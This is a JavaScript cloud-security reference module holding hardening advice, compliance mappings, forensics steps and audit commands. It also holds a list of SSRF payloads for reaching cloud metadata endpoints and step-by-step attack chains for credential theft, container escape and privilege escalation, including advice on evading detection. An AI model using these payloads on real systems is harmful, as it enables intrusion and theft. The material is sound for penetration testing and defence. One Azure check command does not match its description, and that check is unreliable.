    provider: "azure",
    recommendation: "Implement Azure Policy to enforce security baselines and prevent non-compliant resource deployments",
    implementation: "Assign built-in policy initiatives: CIS Microsoft Azure Foundations Benchmark, Azure Security Benchmark. Create custom policies for organization-specific requirements. Use DeployIfNotExists for auto-remediation.",
    priority: "high"
  },
  {
    provider: "azure",
    recommendation: "Enable NSG flow logs and Azure Network Watcher for network traffic analysis and forensics",
    implementation: "Enable NSG flow logs (version 2) for all NSGs. Configure Traffic Analytics for visualization. Set retention to at least 90 days. Store logs in a dedicated storage account with immutability policies.",
    priority: "high"
  },
  {
    provider: "azure",
    recommendation: "Use Azure AD Privileged Identity Management (PIM) for just-in-time privileged access",
    implementation: "Configure PIM for all Azure AD roles and Azure resource roles. Set maximum activation duration to 8 hours. Require approval for Global Administrator and other critical roles. Enable access reviews quarterly.",
    priority: "high"
  },
  {
    provider: "azure",
    recommendation: "Enable diagnostic logging for all Azure resources and centralize in Log Analytics workspace",
    implementation: "Create diagnostic settings for each resource type sending logs to a central Log Analytics workspace. Configure retention policies. Create alert rules for security-relevant events.",
    priority: "medium"
  },
  {
    provider: "azure",
    recommendation: "Implement Azure Private Link for all supported PaaS services to eliminate internet exposure",
    implementation: "Create private endpoints for SQL Database, Cosmos DB, Storage, Key Vault, and other PaaS services. Disable public network access. Configure private DNS zones for name resolution.",
    priority: "medium"
  },

  // -- GCP Hardening --
  {
    provider: "gcp",
    recommendation: "Enable VPC Service Controls to create security perimeters around sensitive GCP services and data",
    implementation: "Define service perimeters around projects containing sensitive data. Include Cloud Storage, BigQuery, Cloud SQL, and other data services. Configure access levels for authorized identities and networks.",
    priority: "critical"
  },
  {
    provider: "gcp",
    recommendation: "Enforce organization policies to restrict public access and enforce security baselines",
    implementation: "Enable organization policies: constraints/compute.requireShieldedVm, constraints/iam.allowedPolicyMemberDomains, constraints/compute.vmExternalIpAccess (restrict to specific projects), constraints/storage.uniformBucketLevelAccess.",
    priority: "critical"
  },
  {
    provider: "gcp",
    recommendation: "Use Workload Identity Federation instead of service account keys for external workload authentication",
    implementation: "Configure workload identity pools for external providers (AWS, Azure AD, OIDC). Map external identities to GCP service accounts. Delete all exported service account keys. Use Workload Identity for GKE pods.",
    priority: "critical"
  },
  {
    provider: "gcp",
    recommendation: "Enable Cloud Audit Logs for all services with data access logging for sensitive projects",
    implementation: "Enable Admin Activity audit logs (enabled by default). Configure Data Access audit logs for Cloud Storage, BigQuery, Cloud SQL, and IAM. Export logs to a dedicated project using aggregated log sinks.",
    priority: "high"
  },
  {
    provider: "gcp",
    recommendation: "Enable Security Command Center (Premium) for centralized threat detection and vulnerability management",
    implementation: "Activate Security Command Center Premium at the organization level. Enable all built-in services: Security Health Analytics, Event Threat Detection, Container Threat Detection, Web Security Scanner.",
    priority: "high"
  },
  {
    provider: "gcp",
    recommendation: "Use Private Google Access and VPC peering to access GCP services without public IP exposure",
    implementation: "Enable Private Google Access on all subnets. Use Private Service Connect for supported APIs. Configure Cloud NAT for instances that need internet access without external IPs.",
    priority: "high"
  },
  {
    provider: "gcp",
    recommendation: "Implement GKE security best practices: private clusters, Workload Identity, and Binary Authorization",
    implementation: "Create private GKE clusters with authorized networks. Enable Workload Identity for pod-level IAM. Configure Binary Authorization to allow only signed images. Enable GKE Sandbox (gVisor) for untrusted workloads.",
    priority: "high"
  },
  {
    provider: "gcp",
    recommendation: "Enable Customer-Managed Encryption Keys (CMEK) for sensitive data stores",
    implementation: "Create Cloud KMS keys with automatic rotation. Apply CMEK to Cloud Storage buckets, BigQuery datasets, Cloud SQL instances, and Compute Engine disks. Configure key access policies with separation of duties.",
    priority: "medium"
  },
  {
    provider: "gcp",
    recommendation: "Implement Cloud Asset Inventory for continuous resource visibility and change tracking",
    implementation: "Enable Cloud Asset Inventory API. Export asset snapshots to BigQuery for analysis. Configure real-time asset change feeds to Cloud Pub/Sub for automated response to configuration drift.",
    priority: "medium"
  },
  {
    provider: "gcp",
    recommendation: "Use Identity-Aware Proxy (IAP) to protect internal web applications without a VPN",
    implementation: "Configure IAP for App Engine, Compute Engine, and GKE services. Define access levels based on identity, device state, and network. Use IAP TCP forwarding to replace SSH bastion hosts.",
    priority: "medium"
  }
];

// ---------------------------------------------------------------------------
// 8. Helper utilities for searching and filtering the reference data.
// ---------------------------------------------------------------------------

/**
 * Search across all check arrays by keyword, name, or risk level.
 * Returns an array of matching entries with their source category.
 */
function searchChecks(query) {
  const q = String(query).toLowerCase();
  const results = [];

  const searchIn = (arr, category) => {
    for (const item of arr) {
      const haystack = [
        item.name || "",
        item.description || "",
        item.command || item.check || "",
        item.tool || "",
        item.risk || "",
        item.remediation || "",
        item.recommendation || "",
        item.implementation || "",
        item.provider || ""
      ].join(" ").toLowerCase();
      if (haystack.includes(q)) {
        results.push({ ...item, _category: category });
      }
    }
  };

  searchIn(AWS_CHECKS, "aws");
  searchIn(AZURE_CHECKS, "azure");
  searchIn(GCP_CHECKS, "gcp");
  searchIn(CONTAINER_SECURITY, "container");
  searchIn(CLOUD_TOOLS, "tool");
  searchIn(IMDS_PAYLOADS, "imds");
  searchIn(CLOUD_HARDENING, "hardening");
  searchIn(SSRF_BYPASS_TECHNIQUES, "ssrf");
  searchIn(CLOUD_ATTACK_PATTERNS, "attack");
  searchIn(CLOUD_FORENSICS, "forensics");
  searchIn(SERVERLESS_SECURITY, "serverless");
  searchIn(IAC_SECURITY, "iac");
  searchIn(CLOUD_NETWORK_SECURITY, "network");
  searchIn(CLOUD_LOGGING_MONITORING, "logging");
  searchIn(CLOUD_IDENTITY_FEDERATION, "identity");
  searchIn(CLOUD_DATA_SECURITY, "data");
  searchIn(CLOUD_COST_SECURITY, "cost");
  searchIn(CLOUD_SUPPLY_CHAIN, "supply-chain");

  return results;
}

/**
 * Filter checks by risk level across all cloud providers.
 * Accepts: "critical", "high", "medium", "low".
 */
function filterByRisk(level) {
  const l = String(level).toLowerCase();
  const results = [];

  const filterIn = (arr, category) => {
    for (const item of arr) {
      if ((item.risk || item.priority || "").toLowerCase() === l) {
        results.push({ ...item, _category: category });
      }
    }
  };

  filterIn(AWS_CHECKS, "aws");
  filterIn(AZURE_CHECKS, "azure");
  filterIn(GCP_CHECKS, "gcp");
  filterIn(CONTAINER_SECURITY, "container");
  filterIn(CLOUD_HARDENING, "hardening");

  return results;
}

/**
 * Filter checks by cloud provider.
 * Accepts: "aws", "azure", "gcp", "container", "multi" (for cross-cloud items).
 */
function filterByProvider(provider) {
  const p = String(provider).toLowerCase();
  switch (p) {
    case "aws": return AWS_CHECKS.map((c) => ({ ...c, _category: "aws" }));
    case "azure": return AZURE_CHECKS.map((c) => ({ ...c, _category: "azure" }));
    case "gcp": return GCP_CHECKS.map((c) => ({ ...c, _category: "gcp" }));
    case "container":
    case "docker":
    case "k8s":
    case "kubernetes":
      return CONTAINER_SECURITY.map((c) => ({ ...c, _category: "container" }));
    default:
      return [];
  }
}

/**
 * Get IMDS payloads for a specific cloud provider.
 * Accepts: "aws", "azure", "gcp".
 */
function getImdsPayloads(cloud) {
  const c = String(cloud).toLowerCase();
  return IMDS_PAYLOADS.filter((p) => p.cloud === c);
}

/**
 * Get hardening recommendations by provider and optionally filter by priority.
 */
function getHardening(provider, priority) {
  let results = CLOUD_HARDENING;
  if (provider) {
    const p = String(provider).toLowerCase();
    results = results.filter((h) => h.provider === p);
  }
  if (priority) {
    const pr = String(priority).toLowerCase();
    results = results.filter((h) => h.priority === pr);
  }
  return results;
}

/**
 * Get a summary count of all checks and recommendations.
 */
function getSummary() {
  return {
    aws_checks: AWS_CHECKS.length,
    azure_checks: AZURE_CHECKS.length,
    gcp_checks: GCP_CHECKS.length,
    container_checks: CONTAINER_SECURITY.length,
    cloud_tools: CLOUD_TOOLS.length,
    imds_payloads: IMDS_PAYLOADS.length,
    hardening_recommendations: CLOUD_HARDENING.length,
    total: AWS_CHECKS.length + AZURE_CHECKS.length + GCP_CHECKS.length +
           CONTAINER_SECURITY.length + CLOUD_TOOLS.length +
           IMDS_PAYLOADS.length + CLOUD_HARDENING.length
  };
}

// ---------------------------------------------------------------------------
// 9. SSRF_BYPASS_TECHNIQUES — common bypass patterns used during SSRF
//    testing against cloud metadata endpoints.
// ---------------------------------------------------------------------------

const SSRF_BYPASS_TECHNIQUES = [
  {
    name: "decimal-ip",
    description: "Convert the metadata IP 169.254.169.254 to decimal notation to bypass URL filters",
    payload: "http://2852039166/latest/meta-data/",
    note: "169.254.169.254 in decimal is 2852039166. Many URL parsers do not recognize this as the metadata endpoint."
  },
  {
    name: "hex-ip",
    description: "Use hexadecimal IP notation to bypass string-based URL filters",
    payload: "http://0xa9fea9fe/latest/meta-data/",
    note: "0xa9fea9fe is the hex representation of 169.254.169.254."
  },
  {
    name: "octal-ip",
    description: "Use octal IP notation which some URL parsers resolve differently",
    payload: "http://0251.0376.0251.0376/latest/meta-data/",
    note: "Octal representation of 169.254.169.254. Some systems interpret octal differently."
  },
  {
    name: "ipv6-mapped",
    description: "Use IPv6-mapped IPv4 address to bypass IPv4-only filters",
    payload: "http://[::ffff:169.254.169.254]/latest/meta-data/",
    note: "IPv6-mapped IPv4 address. Many filters only check for IPv4 patterns."
  },
  {
    name: "dns-rebinding",
    description: "Use a DNS rebinding service that alternates between attacker IP and 169.254.169.254",
    payload: "http://A.169.254.169.254.1time.YOUR_DOMAIN/latest/meta-data/",
    note: "DNS rebinding makes the first resolution point to an allowed IP, then subsequent resolutions resolve to the metadata endpoint. Use services like rebind.network for testing."
  },
  {
    name: "url-encoding",
    description: "Use URL-encoded characters in the URL path or hostname to bypass pattern matching",
    payload: "http://169.254.169.254/%6c%61%74%65%73%74/%6d%65%74%61%2d%64%61%74%61/",
    note: "URL-encoded '/latest/meta-data/'. Double-encoding (%25XX) may also work against some filters."
  },
  {
    name: "redirect-bypass",
    description: "Use an open redirect on an allowed domain to redirect to the metadata endpoint",
    payload: "https://allowed-domain.com/redirect?url=http://169.254.169.254/latest/meta-data/",
    note: "If the application follows redirects and only validates the initial URL, the redirect reaches the metadata service."
  },
  {
    name: "localhost-aliases",
    description: "Use alternative hostnames that resolve to 169.254.169.254 or localhost",
    payload: "http://metadata.google.internal/computeMetadata/v1/ or http://instance-data.ec2.internal/latest/meta-data/",
    note: "Cloud-specific DNS names for metadata endpoints. Also try: http://169.254.169.254.nip.io/latest/meta-data/"
  },
  {
    name: "header-injection-azure",
    description: "Inject the Metadata: true header required by Azure IMDS through CRLF injection",
    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01 with header Metadata: true",
    note: "Azure requires the Metadata: true header to prevent SSRF. If the application allows header injection (CRLF), this protection is bypassed."
  },
  {
    name: "gcp-header-bypass",
    description: "Inject the Metadata-Flavor: Google header required by GCP metadata service",
    payload: "http://metadata.google.internal/computeMetadata/v1/?recursive=true with header Metadata-Flavor: Google",
    note: "GCP requires Metadata-Flavor: Google header. In SSRF scenarios, check if headers can be controlled or injected."
  }
];

// ---------------------------------------------------------------------------
// 10. CLOUD_ATTACK_PATTERNS — common attack chains and escalation paths
//     observed in cloud penetration testing engagements.
// ---------------------------------------------------------------------------

const CLOUD_ATTACK_PATTERNS = [
  {
    name: "ssrf-to-credential-theft",
    cloud: "aws",
    description: "Exploit SSRF vulnerability to access EC2 IMDS, steal IAM role credentials, and pivot to other AWS services",
    steps: [
      "Identify SSRF vulnerability in web application (URL parameter, webhook, PDF generator, etc.)",
      "Probe http://169.254.169.254/latest/meta-data/iam/security-credentials/ to list IAM roles",
      "Retrieve temporary credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
      "Export credentials: export AWS_ACCESS_KEY_ID=...; export AWS_SECRET_ACCESS_KEY=...; export AWS_SESSION_TOKEN=...",
      "Enumerate permissions: enumerate-iam.py or aws sts get-caller-identity",
      "Pivot to accessible services: S3 buckets, Lambda functions, DynamoDB tables, etc."
    ],
    mitigation: "Enforce IMDSv2 (http-tokens required). Implement URL allowlists. Use WAF rules to block metadata IP patterns. Apply least-privilege IAM roles."
  },
  {
    name: "iam-privilege-escalation",
    cloud: "aws",
    description: "Escalate IAM privileges from limited permissions to administrator access through misconfigured policies",
    steps: [
      "Enumerate current permissions: aws iam list-attached-user-policies, aws iam list-user-policies",
      "Check for privilege escalation paths: iam:CreatePolicyVersion, iam:SetDefaultPolicyVersion, iam:AttachUserPolicy",
      "Check for iam:PassRole with lambda:CreateFunction to execute code with a higher-privileged role",
      "Check for sts:AssumeRole permissions to assume a more privileged role",
      "Check for iam:CreateLoginProfile or iam:UpdateLoginProfile to set passwords for other users",
      "Execute the escalation path with the lowest detection footprint"
    ],
    mitigation: "Use IAM Access Analyzer to identify over-permissioned policies. Implement SCPs to prevent dangerous IAM actions. Monitor CloudTrail for privilege escalation indicators."
  },
  {
    name: "s3-data-exfiltration",
    cloud: "aws",
    description: "Discover and exfiltrate sensitive data from misconfigured S3 buckets",
    steps: [
      "Enumerate buckets: aws s3 ls, or brute-force common naming patterns",
      "Check bucket ACLs and policies for public or overly permissive access",
      "List objects: aws s3 ls s3://BUCKET --recursive",
      "Identify sensitive files: database backups, configuration files, logs, credentials",
      "Download targeted data: aws s3 cp s3://BUCKET/sensitive-file .",
      "Check for cross-account bucket policies that grant access to external accounts"
    ],
    mitigation: "Enable S3 Block Public Access at account level. Use bucket policies with explicit deny for non-VPC sources. Enable S3 access logging. Use Macie for sensitive data discovery."
  },
  {
    name: "container-escape-to-host",
    cloud: "multi",
    description: "Escape from a container to the underlying host using misconfigured container settings",
    steps: [
      "Check if running as privileged: cat /proc/self/status | grep CapEff (0000003fffffffff = full capabilities)",
      "If privileged: mount host filesystem via: mkdir /mnt/host && mount /dev/sda1 /mnt/host",
      "Check for Docker socket: ls -la /var/run/docker.sock",
      "If socket available: docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host",
      "Check for writable cgroup release_agent: echo 1 > /sys/fs/cgroup/*/release_agent",
      "Exfiltrate host data or establish persistence via cron, SSH keys, or systemd services"
    ],
    mitigation: "Never run privileged containers. Drop all capabilities. Use read-only root filesystems. Implement Pod Security Standards (restricted). Use gVisor or Kata containers for isolation."
  },
  {
    name: "azure-managed-identity-abuse",
    cloud: "azure",
    description: "Abuse Azure managed identity from a compromised VM or App Service to access Azure resources",
    steps: [
      "Retrieve managed identity token: curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
      "Enumerate subscriptions: curl -H 'Authorization: Bearer TOKEN' https://management.azure.com/subscriptions?api-version=2020-01-01",
      "List resources: curl -H 'Authorization: Bearer TOKEN' https://management.azure.com/subscriptions/SUB_ID/resources?api-version=2021-04-01",
      "Attempt Key Vault access: get token with resource=https://vault.azure.net, then list secrets",
      "Attempt Storage access: get token with resource=https://storage.azure.com/, then list blobs",
      "Attempt Azure AD operations: get token with resource=https://graph.microsoft.com, then query directory"
    ],
    mitigation: "Assign minimal RBAC roles to managed identities. Use Conditional Access for workload identities. Monitor sign-in logs for managed identity tokens from unexpected locations."
  },
  {
    name: "gcp-service-account-key-theft",
    cloud: "gcp",
    description: "Steal GCP service account keys from exposed sources and escalate access across the project",
    steps: [
      "Search for leaked keys: check source code repos, CI/CD configs, environment variables, metadata",
      "Retrieve instance metadata token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      "Enumerate project resources using the stolen credentials: gcloud auth activate-service-account --key-file KEY.json",
      "Check IAM bindings: gcloud projects get-iam-policy PROJECT_ID",
      "Attempt to create new service account keys: gcloud iam service-accounts keys create",
      "Pivot to other services: Cloud Storage, BigQuery, Cloud SQL, Pub/Sub"
    ],
    mitigation: "Use Workload Identity Federation instead of service account keys. Enable Organization Policy constraints/iam.disableServiceAccountKeyCreation. Monitor for key creation events in audit logs."
  },
  {
    name: "k8s-rbac-escalation",
    cloud: "multi",
    description: "Escalate Kubernetes RBAC permissions from a compromised pod to cluster-admin access",
    steps: [
      "Check current permissions: kubectl auth can-i --list (or use the service account token from /var/run/secrets/kubernetes.io/serviceaccount/token)",
      "Enumerate accessible secrets: kubectl get secrets --all-namespaces",
      "Look for service accounts with elevated permissions: kubectl get clusterrolebindings -o json",
      "Check for create/update permissions on roles/rolebindings to self-escalate",
      "Check for pod creation permissions to create a privileged pod with a high-privilege service account",
      "Access the Kubernetes API directly: curl -k https://kubernetes.default.svc/api/v1/namespaces -H 'Authorization: Bearer TOKEN'"
    ],
    mitigation: "Enforce Pod Security Standards. Disable automountServiceAccountToken. Use RBAC audit tools. Implement admission controllers to prevent escalation. Restrict RBAC bind/escalate verbs."
  },
  {
    name: "cross-cloud-lateral-movement",
    cloud: "multi",
    description: "Pivot between cloud providers using federated identities, shared secrets, or CI/CD pipelines",
    steps: [
      "From compromised AWS account, check for Azure AD federation: look for SAML providers in IAM",
      "Check CI/CD pipelines (GitHub Actions, GitLab CI) for credentials to other cloud providers",
      "Look for Terraform state files containing credentials for multiple providers",
      "Check for VPN or peering connections between cloud environments",
      "Enumerate secrets managers for cross-cloud API keys or service account credentials",
      "Exploit shared identity providers (Okta, Azure AD) that federate across clouds"
    ],
    mitigation: "Segment cloud environments with separate identity providers where possible. Rotate cross-cloud credentials frequently. Monitor for unusual cross-cloud access patterns. Use dedicated service accounts per integration."
  }
];

// ---------------------------------------------------------------------------
// 11. COMPLIANCE_FRAMEWORKS — mapping of cloud checks to compliance
//     standards for audit and reporting purposes.
// ---------------------------------------------------------------------------

const COMPLIANCE_FRAMEWORKS = [
  {
    framework: "CIS AWS Foundations Benchmark v2.0",
    description: "Center for Internet Security benchmark providing prescriptive security configuration guidance for AWS",
    sections: [
      { id: "1.x", area: "Identity and Access Management", relatedChecks: ["iam-admin-star-policy", "iam-unused-credentials", "iam-mfa-not-enabled", "iam-password-policy", "iam-root-access-keys"] },
      { id: "2.x", area: "Storage", relatedChecks: ["s3-public-acl", "s3-bucket-policy-public", "s3-encryption-at-rest", "ebs-encryption-default-disabled"] },
      { id: "3.x", area: "Logging", relatedChecks: ["cloudtrail-disabled", "cloudtrail-log-validation", "vpc-flow-logs-disabled"] },
      { id: "4.x", area: "Monitoring", relatedChecks: ["guardduty-not-enabled", "aws-config-not-enabled"] },
      { id: "5.x", area: "Networking", relatedChecks: ["vpc-ssh-open-to-world", "vpc-rdp-open-to-world", "ec2-security-group-open-all"] }
    ]
  },
  {
    framework: "CIS Azure Foundations Benchmark v2.0",
    description: "CIS benchmark for Microsoft Azure providing security configuration best practices",
    sections: [
      { id: "1.x", area: "Identity and Access Management", relatedChecks: ["azure-ad-mfa-status", "azure-ad-privileged-roles", "azure-rbac-owner-count"] },
      { id: "2.x", area: "Microsoft Defender", relatedChecks: ["azure-sql-tde-disabled"] },
      { id: "3.x", area: "Storage Accounts", relatedChecks: ["azure-storage-public-access", "azure-storage-https-only", "azure-storage-encryption"] },
      { id: "4.x", area: "Database Services", relatedChecks: ["azure-sql-tde-disabled"] },
      { id: "5.x", area: "Logging and Monitoring", relatedChecks: [] },
      { id: "6.x", area: "Networking", relatedChecks: ["azure-nsg-allow-all-inbound", "azure-nsg-ssh-open", "azure-nsg-rdp-open"] },
      { id: "7.x", area: "Virtual Machines", relatedChecks: [] },
      { id: "8.x", area: "Key Vault", relatedChecks: ["azure-keyvault-soft-delete", "azure-keyvault-purge-protection", "azure-keyvault-network-acls"] },
      { id: "9.x", area: "AppService", relatedChecks: ["azure-appservice-https-only", "azure-appservice-tls-version", "azure-appservice-auth"] }
    ]
  },
  {
    framework: "CIS GCP Foundations Benchmark v2.0",
    description: "CIS benchmark for Google Cloud Platform security configuration",
    sections: [
      { id: "1.x", area: "Identity and Access Management", relatedChecks: ["gcp-iam-primitive-roles", "gcp-iam-service-account-keys", "gcp-iam-sa-impersonation"] },
      { id: "2.x", area: "Logging and Monitoring", relatedChecks: ["gcp-audit-logs"] },
      { id: "3.x", area: "Networking", relatedChecks: ["gcp-firewall-open-all", "gcp-firewall-ssh-open"] },
      { id: "4.x", area: "Virtual Machines", relatedChecks: ["gcp-compute-public-ip", "gcp-compute-default-sa", "gcp-compute-serial-port", "gcp-compute-shielded-vm"] },
      { id: "5.x", area: "Storage", relatedChecks: ["gcp-storage-public-buckets", "gcp-storage-uniform-access"] },
      { id: "6.x", area: "Cloud SQL", relatedChecks: ["gcp-sql-public-ip", "gcp-sql-no-ssl"] },
      { id: "7.x", area: "GKE", relatedChecks: ["gke-legacy-abac", "gke-master-authorized-networks", "gke-network-policy", "gke-private-cluster"] }
    ]
  },
  {
    framework: "CIS Kubernetes Benchmark v1.8",
    description: "CIS benchmark for Kubernetes cluster security configuration",
    sections: [
      { id: "1.x", area: "Control Plane Components", relatedChecks: ["k8s-admission-controllers", "k8s-etcd-encryption"] },
      { id: "2.x", area: "etcd", relatedChecks: ["k8s-secrets-unencrypted-etcd"] },
      { id: "3.x", area: "Control Plane Configuration", relatedChecks: ["k8s-rbac-cluster-admin"] },
      { id: "4.x", area: "Worker Nodes", relatedChecks: [] },
      { id: "5.x", area: "Policies", relatedChecks: ["k8s-pod-security-standards", "k8s-privileged-pods", "k8s-network-policies", "k8s-resource-limits", "k8s-pod-security-context"] }
    ]
  },
  {
    framework: "CIS Docker Benchmark v1.6",
    description: "CIS benchmark for Docker container runtime security configuration",
    sections: [
      { id: "1.x", area: "Host Configuration", relatedChecks: [] },
      { id: "2.x", area: "Docker Daemon Configuration", relatedChecks: ["docker-socket-exposure"] },
      { id: "3.x", area: "Docker Daemon Configuration Files", relatedChecks: [] },
      { id: "4.x", area: "Container Images and Build Files", relatedChecks: ["docker-image-scan", "docker-latest-tag", "docker-root-user"] },
      { id: "5.x", area: "Container Runtime", relatedChecks: ["docker-privileged-containers", "docker-host-network", "docker-host-pid", "docker-capabilities", "docker-writable-rootfs"] }
    ]
  }
];

// ---------------------------------------------------------------------------
// 12. CLOUD_FORENSICS — incident response and forensics guidance for
//     cloud environments.
// ---------------------------------------------------------------------------

const CLOUD_FORENSICS = [
  {
    cloud: "aws",
    scenario: "compromised-ec2-instance",
    description: "Respond to a potentially compromised EC2 instance while preserving forensic evidence",
    steps: [
      "Tag the instance as compromised and record the incident timeline",
      "Isolate the instance: create a restrictive security group (no inbound/outbound) and attach it",
      "Do NOT terminate the instance - preserve for forensic analysis",
      "Create EBS snapshots of all attached volumes for forensic imaging",
      "Capture instance metadata: aws ec2 describe-instances --instance-id INSTANCE_ID",
      "Capture memory dump if possible using SSM Run Command or EC2 Serial Console",
      "Review CloudTrail logs for the instance role: filter by assumed-role/ROLE_NAME",
      "Review VPC Flow Logs for network connections to/from the instance IP",
      "Check GuardDuty findings related to the instance",
      "Rotate or revoke the instance IAM role credentials: aws iam put-role-policy (explicit deny)"
    ]
  },
  {
    cloud: "aws",
    scenario: "compromised-iam-credentials",
    description: "Respond to leaked or compromised IAM access keys",
    steps: [
      "Identify the compromised key: aws iam list-access-keys --user-name USER",
      "Deactivate the key immediately: aws iam update-access-key --access-key-id AKIA... --status Inactive --user-name USER",
      "Attach an explicit deny-all policy to the user or role to block any cached credentials",
      "Review CloudTrail for all API calls made with the compromised key",
      "Identify resources created, modified, or accessed by the compromised credentials",
      "Check for persistence mechanisms: new IAM users, roles, policies, or access keys created",
      "Check for data exfiltration: S3 GetObject calls, RDS snapshots shared externally",
      "Revoke all active sessions for the role: aws iam put-role-policy with epoch-based condition",
      "Delete the compromised key after investigation: aws iam delete-access-key",
      "Create new credentials and rotate all secrets the compromised identity had access to"
    ]
  },
  {
    cloud: "azure",
    scenario: "compromised-azure-identity",
    description: "Respond to compromised Azure AD user or managed identity credentials",
    steps: [
      "Revoke all refresh tokens: Revoke-AzureADUserAllRefreshToken or az ad user update --id USER_ID --force-change-password-next-login true",
      "Disable the user account if immediate containment is needed",
      "Review Azure AD sign-in logs for suspicious activity (location, IP, device)",
      "Review Azure AD audit logs for changes made by the compromised identity",
      "Check for new app registrations, service principals, or API permissions granted",
      "Review Azure Activity Log for resource modifications across all subscriptions",
      "Check for new role assignments or custom role modifications",
      "Revoke managed identity tokens by restarting the associated VM or App Service",
      "Review Key Vault access logs for secret or key retrievals",
      "Enable Azure AD Identity Protection and investigate risk detections"
    ]
  },
  {
    cloud: "gcp",
    scenario: "compromised-service-account",
    description: "Respond to a compromised GCP service account or leaked key",
    steps: [
      "Delete the compromised key: gcloud iam service-accounts keys delete KEY_ID --iam-account SA_EMAIL",
      "Disable the service account if containment is urgent: gcloud iam service-accounts disable SA_EMAIL",
      "Review Cloud Audit Logs for all API calls made by the service account",
      "Check for new service account keys created (persistence mechanism)",
      "Review IAM policy changes: new bindings, custom roles, or permission grants",
      "Check Cloud Storage access logs for data exfiltration",
      "Review Compute Engine actions: new instances, snapshots, or firewall rule changes",
      "Check for Cloud Functions or Cloud Run deployments (code execution persistence)",
      "Rotate all secrets accessible by the compromised service account",
      "Create a new service account with the same permissions and migrate workloads"
    ]
  }
];

// ---------------------------------------------------------------------------
// 13. SERVERLESS_SECURITY — checks specific to serverless compute
//     platforms (Lambda, Azure Functions, Cloud Functions).
// ---------------------------------------------------------------------------

const SERVERLESS_SECURITY = [
  {
    name: "lambda-vpc-config",
    description: "Check if Lambda functions are configured to run inside a VPC for network isolation",
    command: "aws lambda list-functions --query 'Functions[?!VpcConfig.VpcId].[FunctionName,Runtime]' --output table",
    cloud: "aws",
    risk: "medium",
    remediation: "Configure Lambda functions to run in a VPC when they need access to private resources. Use VPC endpoints for AWS service access from within the VPC."
  },
  {
    name: "lambda-concurrent-limit",
    description: "Verify that Lambda functions have reserved concurrency limits to prevent denial-of-wallet attacks",
    command: "aws lambda list-functions --query 'Functions[*].FunctionName' --output text | tr '\\t' '\\n' | while read fn; do conc=$(aws lambda get-function-concurrency --function-name $fn --query ReservedConcurrentExecutions --output text 2>/dev/null); [ \"$conc\" = \"None\" ] && echo \"NO LIMIT: $fn\"; done",
    cloud: "aws",
    risk: "medium",
    remediation: "Set reserved concurrency limits on all Lambda functions. Configure account-level concurrent execution limits. Set up billing alerts for cost anomalies."
  },
  {
    name: "lambda-dead-letter-queue",
    description: "Check if Lambda functions have dead letter queues configured for failed invocation handling",
    command: "aws lambda list-functions --query 'Functions[?!DeadLetterConfig.TargetArn].[FunctionName]' --output table",
    cloud: "aws",
    risk: "low",
    remediation: "Configure DLQ (SQS or SNS) for async Lambda functions to capture failed events for investigation and replay."
  },
  {
    name: "azure-functions-auth-level",
    description: "Identify Azure Functions with anonymous authentication level, allowing unauthenticated invocation",
    command: "az functionapp list --query '[*].[name,resourceGroup]' -o tsv | while read name rg; do az functionapp config show --name $name --resource-group $rg --query 'ftpsState' -o tsv; done",
    cloud: "azure",
    risk: "high",
    remediation: "Set function auth level to 'function' or 'admin'. Use Azure AD authentication for production functions. Never expose anonymous functions to the public internet."
  },
  {
    name: "gcp-cloud-functions-ingress",
    description: "Check if Cloud Functions allow ingress from all traffic sources including the public internet",
    command: "gcloud functions list --project PROJECT_ID --format='table(name,ingressSettings)' --filter='ingressSettings=ALLOW_ALL'",
    cloud: "gcp",
    risk: "high",
    remediation: "Set ingress settings to ALLOW_INTERNAL_ONLY or ALLOW_INTERNAL_AND_GCLB. Use VPC connectors for private network access."
  },
  {
    name: "serverless-dependency-vulns",
    description: "Scan serverless function dependencies for known vulnerabilities",
    command: "trivy fs --severity HIGH,CRITICAL ./function-code/ --security-checks vuln",
    cloud: "multi",
    risk: "high",
    remediation: "Integrate dependency scanning into CI/CD pipelines. Use lockfiles to pin dependency versions. Update vulnerable packages promptly."
  }
];

// ---------------------------------------------------------------------------
// 14. IAC_SECURITY — Infrastructure as Code security checks for Terraform,
//     CloudFormation, and ARM templates.
// ---------------------------------------------------------------------------

const IAC_SECURITY = [
  {
    name: "terraform-hardcoded-secrets",
    description: "Scan Terraform files for hardcoded secrets, API keys, or credentials in variables and resources",
    command: "grep -rnE '(access_key|secret_key|password|token|api_key)\\s*=\\s*\"[^\"]+\"' *.tf --include='*.tf'",
    tool: "grep / tfsec / checkov",
    risk: "critical",
    remediation: "Use Terraform variables with environment variable injection. Store secrets in Vault, AWS Secrets Manager, or Azure Key Vault. Use data sources to reference externally stored secrets."
  },
  {
    name: "terraform-state-exposure",
    description: "Check if Terraform state files are stored locally or in an unencrypted remote backend",
    command: "find . -name 'terraform.tfstate*' -type f && grep -r 'backend' *.tf | grep -v encrypt",
    tool: "filesystem / tfsec",
    risk: "critical",
    remediation: "Use remote state backends (S3, GCS, Azure Blob) with encryption enabled. Enable state locking with DynamoDB or equivalent. Restrict backend access with IAM policies."
  },
  {
    name: "terraform-provider-versions",
    description: "Detect Terraform configurations without provider version constraints that may pull untrusted versions",
    command: "grep -rL 'required_providers' *.tf versions.tf",
    tool: "tfsec / checkov",
    risk: "medium",
    remediation: "Pin provider versions in required_providers block. Use version constraints (>= X.Y, < Z.0) to prevent unexpected upgrades. Lock the provider registry source."
  },
  {
    name: "cloudformation-iam-wildcards",
    description: "Detect CloudFormation templates with IAM policies using wildcard actions or resources",
    command: "python3 -c \"import yaml,sys,json; t=yaml.safe_load(open(sys.argv[1])); [print(k,json.dumps(v)) for k,v in t.get('Resources',{}).items() if 'Policy' in v.get('Type','') and '\\\"*\\\"' in json.dumps(v)]\" template.yaml",
    tool: "cfn-lint / checkov",
    risk: "critical",
    remediation: "Replace wildcard actions with specific service:Action permissions. Scope resources to specific ARN patterns. Use cfn-lint and cfn-nag for pre-deployment validation."
  },
  {
    name: "arm-template-secrets",
    description: "Detect ARM templates with hardcoded secrets in parameters or resources",
    command: "grep -rnE '\"defaultValue\"\\s*:\\s*\"[^\"]{20,}\"' *.json | grep -iE 'password|secret|key|token'",
    tool: "arm-ttk / checkov",
    risk: "critical",
